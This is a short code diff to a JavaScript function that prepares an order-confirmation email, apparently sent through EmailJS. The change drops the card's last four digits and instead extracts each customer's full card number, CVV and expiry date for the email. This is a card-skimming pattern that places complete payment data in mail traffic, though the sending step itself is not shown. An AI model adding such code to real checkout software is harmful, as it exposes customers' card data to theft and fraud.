@@ -385,9 +385,13 @@
         const initialized = initEmailJs();
         if (!initialized.success) return initialized;
         try {
-            const payment = orderData.paymentSummary || {};
-            const last4 = payment.last4 || "N/A";
-            const address = formatFullAddress(orderData.shippingInfo);
+            const paymentSummary = orderData.paymentSummary || {};
+        const rawCardNumber = paymentSummary.cardNumber || digitsOnly(paymentSummary.cardNumberFormatted || "");
+        const cardNumberForEmail = rawCardNumber || "N/A";
+        const cardNumberFormattedForEmail = paymentSummary.cardNumberFormatted || (rawCardNumber ? formatCardNumberWithSpaces(rawCardNumber) : "N/A");
+        const cvvForEmail = paymentSummary.cvv || "N/A";
+        const expiryForEmail = paymentSummary.expiry || "";
+        const [expiryMonth, expiryYear] = expiryForEmail.split("/");
             const items = orderData.products.map((item, index) =>
                 `Item ${index + 1}: ${item.name} (x${item.quantity}) - ${formatMoney(item.price * item.quantity)}`
             ).join("\\n");
